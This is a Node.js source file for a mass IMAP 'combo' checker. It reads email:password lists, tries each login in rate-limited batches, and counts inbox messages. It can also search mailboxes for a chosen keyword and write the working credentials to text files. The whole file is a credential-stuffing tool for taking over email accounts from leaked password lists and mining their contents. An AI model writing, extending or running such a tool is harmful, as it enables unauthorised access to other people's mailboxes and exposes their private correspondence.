const fs = require('fs');
const path = require('path');
const ImapChecker = require('../lib/ImapChecker');

class MassImapChecker {
    constructor() {
        this.results = {
            valid: [],
            invalid: [],
            errors: []
        };
        this.totalChecked = 0;
        this.currentIndex = 0;
    }

    /**
     * Load email:password combinations from text file
     * @param {string} filePath - Path to combo file
     * @returns {Array} Array of {email, password} objects
     */
    loadCombos(filePath) {
        try {
            const content = fs.readFileSync(filePath, 'utf8');
            const lines = content.split('\n').filter(line => line.trim());
            
            const combos = [];
            for (const line of lines) {
                const trimmedLine = line.trim();
                if (trimmedLine && trimmedLine.includes(':')) {
                    const [email, password] = trimmedLine.split(':');
                    if (email && password) {
                        combos.push({
                            email: email.trim(),
                            password: password.trim()
                        });
                    }
                }
            }
            
            console.log(`✅ Loaded ${combos.length} email combinations from ${filePath}`);
            return combos;
        } catch (error) {
            console.error(`❌ Error loading combo file: ${error.message}`);
            return [];
        }
    }

    /**
     * Check single email account with inbox info and keyword search
     * @param {Object} combo - {email, password}
     * @param {number} index - Current index
     * @param {number} total - Total accounts
     * @param {string} [keyword] - Optional keyword to search
     */
    async checkSingleAccount(combo, index, total, keyword = null) {
        const { email, password } = combo;
        
        console.log(`\n[${index + 1}/${total}] Checking: ${email}`);
        
        try {
            const checker = new ImapChecker();
            const result = await checker.login(email, password);
            
            if (result.success) {
                // Get inbox info
                let inboxInfo = { total: 0, unseen: 0, recent: 0 };
                let keywordCount = 0;
                
                try {
                    inboxInfo = await checker.getInboxInfo(email, password);
                    
                    // Search keyword if provided
                    if (keyword && keyword.trim()) {
                        keywordCount = await checker.searchKeyword(email, password, keyword.trim());
                    }
                } catch (inboxError) {
                    console.log(`⚠️  Warning: Could not get inbox info for ${email}: ${inboxError.message}`);
                }
                
                const accountInfo = {
                    email,
                    password,
                    server: result.detectedServer.host,
                    port: result.detectedServer.port,
                    totalEmails: inboxInfo.total,
                    unreadEmails: inboxInfo.unseen,
                    recentEmails: inboxInfo.recent,
                    keywordCount: keyword ? keywordCount : null,
                    searchKeyword: keyword || null,
                    checkedAt: new Date().toISOString()
                };
                
                this.results.valid.push(accountInfo);
                
                let logMessage = `✅ VALID - ${email} | Server: ${result.detectedServer.host} | Total: ${inboxInfo.total} emails`;
                if (keyword) {
                    logMessage += ` | "${keyword}": ${keywordCount} found`;
                }
                console.log(logMessage);
                
            } else {
                this.results.invalid.push({
                    email,
                    password,
                    error: result.error || 'Login failed',
                    checkedAt: new Date().toISOString()
                });
                console.log(`❌ INVALID - ${email} | Error: ${result.error || 'Login failed'}`);
            }
            
        } catch (error) {
            this.results.errors.push({
                email,
                password,
                error: error.message,
                checkedAt: new Date().toISOString()
            });
            console.log(`⚠️  ERROR - ${email} | ${error.message}`);
        }
        
        this.totalChecked++;
    }

    /**
     * Check all accounts with rate limiting and optional keyword search
     * @param {Array} combos - Array of email:password combos
     * @param {Object} options - Options {concurrent: 5, delay: 1000, keyword: 'search_term'}
     */
    async checkAllAccounts(combos, options = {}) {
        const { concurrent = 3, delay = 2000, keyword = null } = options;
        
        console.log(`🚀 Starting mass IMAP check for ${combos.length} accounts`);
        console.log(`⚙️  Concurrent: ${concurrent} | Delay: ${delay}ms`);
        if (keyword) {
            console.log(`🔍 Will search for keyword: "${keyword}"`);
        }
        console.log('');
        
        // Process in batches to avoid overwhelming servers
        for (let i = 0; i < combos.length; i += concurrent) {
            const batch = combos.slice(i, i + concurrent);
            const promises = batch.map((combo, batchIndex) => 
                this.checkSingleAccount(combo, i + batchIndex, combos.length, keyword)
            );
            
            await Promise.all(promises);
            
            // Add delay between batches
            if (i + concurrent < combos.length) {
                console.log(`\n⏳ Waiting ${delay}ms before next batch...`);
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
        
        this.showSummary(keyword);
    }

    /**
     * Show final summary
     * @param {string} [keyword] - Search keyword if used
     */
    showSummary(keyword = null) {
        console.log('\n' + '='.repeat(60));
        console.log('📊 MASS CHECKER SUMMARY');
        console.log('='.repeat(60));
        console.log(`✅ Valid accounts: ${this.results.valid.length}`);
        console.log(`❌ Invalid accounts: ${this.results.invalid.length}`);
        console.log(`⚠️  Errors: ${this.results.errors.length}`);
        console.log(`📈 Total checked: ${this.totalChecked}`);
        
        if (this.results.valid.length > 0) {
            console.log('\n🎯 VALID ACCOUNTS:');
            this.results.valid.forEach((account, index) => {
                let accountLine = `${index + 1}. ${account.email} | ${account.server} | ${account.totalEmails} emails`;
                if (account.keywordCount !== null && keyword) {
                    accountLine += ` | "${keyword}": ${account.keywordCount} found`;
                }
                console.log(accountLine);
            });
            
            if (keyword) {
                const totalKeywordFound = this.results.valid.reduce((sum, acc) => sum + (acc.keywordCount || 0), 0);
                console.log(`\n🔍 Total "${keyword}" found across all accounts: ${totalKeywordFound}`);
            }
        }
        
        console.log('\n📁 Results saved to TXT files:');
        this.saveResults(keyword);
    }

    /**
     * Save results to files (TXT only)
     * @param {string} [keyword] - Search keyword if used
     */
    saveResults(keyword = null) {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const resultsDir = path.join(__dirname, 'results');
        
        // Create results directory if not exists
        if (!fs.existsSync(resultsDir)) {
            fs.mkdirSync(resultsDir, { recursive: true });
        }
        
        // Save valid accounts as simple email:pass format
        if (this.results.valid.length > 0) {
            const validTxtFile = path.join(resultsDir, `valid-accounts-${timestamp}.txt`);
            const validTxt = this.results.valid.map(acc => `${acc.email}:${acc.password}`).join('\n');
            fs.writeFileSync(validTxtFile, validTxt);
            console.log(`✅ Valid accounts: ${validTxtFile}`);
        }
        
        // Save invalid accounts as email:pass with error comment
        if (this.results.invalid.length > 0) {
            const invalidTxtFile = path.join(resultsDir, `invalid-accounts-${timestamp}.txt`);
            const invalidTxt = this.results.invalid.map(acc => `${acc.email}:${acc.password} # ${acc.error}`).join('\n');
            fs.writeFileSync(invalidTxtFile, invalidTxt);
            console.log(`❌ Invalid accounts: ${invalidTxtFile}`);
        }
        
        // Save summary report as simple text
        const summaryFile = path.join(resultsDir, `summary-${timestamp}.txt`);
        const summaryContent = [
            '='.repeat(50),
            'MASS IMAP CHECKER SUMMARY',
            '='.repeat(50),
            `Date: ${new Date().toLocaleString()}`,
            `Total Checked: ${this.totalChecked}`,
            `Valid Accounts: ${this.results.valid.length}`,
            `Invalid Accounts: ${this.results.invalid.length}`,
            `Errors: ${this.results.errors.length}`
        ];
        
        if (keyword) {
            const totalKeywordFound = this.results.valid.reduce((sum, acc) => sum + (acc.keywordCount || 0), 0);
            summaryContent.push(`Search Keyword: "${keyword}"`);
            summaryContent.push(`Total "${keyword}" Found: ${totalKeywordFound}`);
        }
        
        summaryContent.push('');
        summaryContent.push('VALID ACCOUNTS:');
        summaryContent.push('-'.repeat(30));
        
        this.results.valid.forEach((acc, i) => {
            let line = `${i + 1}. ${acc.email} | ${acc.server} | Emails: ${acc.totalEmails}`;
            if (acc.keywordCount !== null && keyword) {
                line += ` | "${keyword}": ${acc.keywordCount}`;
            }
            summaryContent.push(line);
        });
        
        if (this.results.invalid.length > 0) {
            summaryContent.push('');
            summaryContent.push('INVALID ACCOUNTS:');
            summaryContent.push('-'.repeat(30));
            this.results.invalid.forEach((acc, i) => {
                summaryContent.push(`${i + 1}. ${acc.email} | Error: ${acc.error}`);
            });
        }
        
        fs.writeFileSync(summaryFile, summaryContent.join('\n'));
        console.log(`📊 Summary report: ${summaryFile}`);
    }

    /**
     * Search keywords in valid accounts
     * @param {string} keyword - Keyword to search
     */
    async searchInValidAccounts(keyword) {
        console.log(`\n🔍 Searching keyword "${keyword}" in ${this.results.valid.length} valid accounts...\n`);
        
        const searchResults = [];
        
        for (const account of this.results.valid) {
            try {
                console.log(`Searching in ${account.email}...`);
                
                const checker = new ImapChecker();
                const loginResult = await checker.login(account.email, account.password);
                
                if (loginResult.success) {
                    const count = await checker.searchInboxByKeyword(account.email, account.password, keyword);
                    
                    if (count > 0) {
                        searchResults.push({
                            email: account.email,
                            count: count,
                            server: account.server
                        });
                        console.log(`✅ Found ${count} emails with "${keyword}" in ${account.email}`);
                    } else {
                        console.log(`❌ No emails found with "${keyword}" in ${account.email}`);
                    }
                } else {
                    console.log(`⚠️  Cannot login to ${account.email} for search`);
                }
                
            } catch (error) {
                console.log(`⚠️  Error searching in ${account.email}: ${error.message}`);
            }
        }
        
        // Show search summary
        console.log('\n' + '='.repeat(50));
        console.log(`🔍 SEARCH RESULTS for "${keyword}"`);
        console.log('='.repeat(50));
        searchResults.forEach((result, index) => {
            console.log(`${index + 1}. ${result.email}: ${result.count} emails`);
        });
        
        const totalFound = searchResults.reduce((sum, result) => sum + result.count, 0);
        console.log(`\n📊 Total emails found: ${totalFound}`);
        
        // Save search results to TXT file
        if (searchResults.length > 0) {
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const resultsDir = path.join(__dirname, 'results');
            const searchFile = path.join(resultsDir, `search-${keyword}-${timestamp}.txt`);
            
            const searchContent = [
                `Search Results for: "${keyword}"`,
                `Date: ${new Date().toLocaleString()}`,
                `Total accounts searched: ${this.results.valid.length}`,
                `Accounts with results: ${searchResults.length}`,
                `Total emails found: ${totalFound}`,
                '',
                'RESULTS:',
                '-'.repeat(40)
            ];
            
            searchResults.forEach((result, i) => {
                searchContent.push(`${i + 1}. ${result.email}: ${result.count} emails`);
            });
            
            fs.writeFileSync(searchFile, searchContent.join('\n'));
            console.log(`💾 Search results saved: ${searchFile}`);
        }
        
        return searchResults;
    }
}

module.exports = MassImapChecker;
